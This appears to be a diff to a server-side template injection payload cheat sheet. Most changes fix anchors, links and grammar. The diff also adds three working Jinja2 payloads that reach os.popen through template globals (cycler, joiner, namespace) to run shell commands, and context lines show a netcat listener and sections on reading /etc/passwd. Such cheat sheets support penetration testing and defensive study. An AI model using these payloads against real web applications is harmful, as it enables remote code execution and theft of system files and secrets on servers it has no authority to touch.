@@ -8,12 +8,12 @@
 * [Methodology](#methodology)
 * [Ruby](#ruby)
   * [Basic injections](#ruby---basic-injections)
-  * [Retrieve /etc/passwd](#ruby---retrieve--etc-passwd)
+  * [Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
   * [List files and directories](#ruby---list-files-and-directories)
 * [Java](#java)
   * [Basic injection](#java---basic-injection)
-  * [Retrieve the system’s environment variables](#java---retrieve-the-system-s-environment-variables)
-  * [Retrieve /etc/passwd](#java---retrieve--etc-passwd)
+  * [Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+  * [Retrieve /etc/passwd](#java---retrieve-etcpasswd)
 * [Expression Language EL](#expression-language-el)
   * [Basic injection](#expression-language-el---basic-injection)
   * [Code execution](#expression-language-el---code-execution)
@@ -29,7 +29,7 @@
 * [Pebble](#pebble)
   * [Basic injection](#pebble---basic-injection)
   * [Code execution](#pebble---code-execution)
-* [Jade / Codepen](#jade---codepen)
+* [Jade / Codepen](#jade--codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
 * [Jinja2](#jinja2)
@@ -335,7 +335,7 @@ ${x}
 
 ## Jinja2
 
-[Official website](http://jinja.pocoo.org/)
+[Official website](https://jinja.palletsprojects.com/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
 ### Jinja2 - Basic injection
@@ -347,7 +347,7 @@ ${x}
 ```
 
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
-The above injections have been tested on Flask application.
+The above injections have been tested on a Flask application.
 
 ### Jinja2 - Template format
 
@@ -414,7 +414,26 @@ Listen for connection
 nc -lnvp 8000
 ```
 
-#### Exploit the SSTI by calling subprocess.Popen.
+#### Exploit the SSTI by calling os.popen().read()
+
+These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+```python
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+```
+
+```python
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+#### Exploit the SSTI by calling subprocess.Popen
+
 :warning: the number 396 will vary depending of the application.
 
 ```python
